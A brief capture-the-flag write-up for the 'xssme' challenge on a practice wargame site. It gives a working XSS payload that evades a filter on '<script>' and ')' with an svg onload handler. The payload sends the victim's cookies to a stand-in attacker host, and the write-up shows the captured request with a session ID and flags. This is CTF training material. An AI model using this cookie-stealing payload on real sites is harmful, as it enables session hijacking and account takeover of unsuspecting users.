# Writeup  
https://hackme.inndy.tw/scoreboard/  

## 33. xssme  
Simple xss challenge. Register to the dashboard, we can send a email to admin there. So we should make a xss to get admin cookie. However, he blocks the characters like `<script>` and `)`. My final payload:  
```php
<svg/onload="document.location='my.vps.ip?'+document.cookie">
```  
On my request bin:  
```php
GET /1auwng91?PHPSESSID=v64v8ei47nj3itb6qrcbbj8575; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}; FLAG_2=IN_THE_REDIS
```  
Get the flag!
